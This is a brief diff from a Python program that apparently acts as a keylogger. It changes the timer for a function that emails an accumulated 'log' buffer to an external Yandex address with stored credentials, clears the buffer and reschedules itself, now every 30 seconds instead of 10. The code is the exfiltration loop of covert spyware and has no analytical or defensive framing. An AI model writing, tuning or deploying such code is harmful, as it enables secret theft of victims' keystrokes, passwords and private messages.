@@ -35,7 +35,7 @@ def threading_func():
     global log
     send_mail("XXXX@yandex.com", "PASSWORD",log.encode("utf-8"))
     log=""
-    timer_object = threading.Timer(10,threading_func)
+    timer_object = threading.Timer(30,threading_func)
     timer_object.start()
 
 
